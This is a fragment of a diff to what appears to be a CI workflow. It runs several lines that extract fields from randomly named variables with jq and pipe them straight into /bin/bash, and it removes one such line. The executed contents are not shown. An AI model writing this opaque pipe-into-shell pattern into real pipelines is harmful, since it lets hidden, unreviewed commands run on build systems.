@@ -22,7 +22,6 @@ jobs:
           echo $rixra486 | jq -r .o50175 | /bin/bash
           printf '%s' "$hssd5949" | jq -r .s54254 | /bin/bash
           printf '%s' "$wwgl708" | jq -r .ax85 | /bin/bash
-          echo $m592 | jq -r .ckffg128 | /bin/bash
 
       - name: Store results
         if: always()
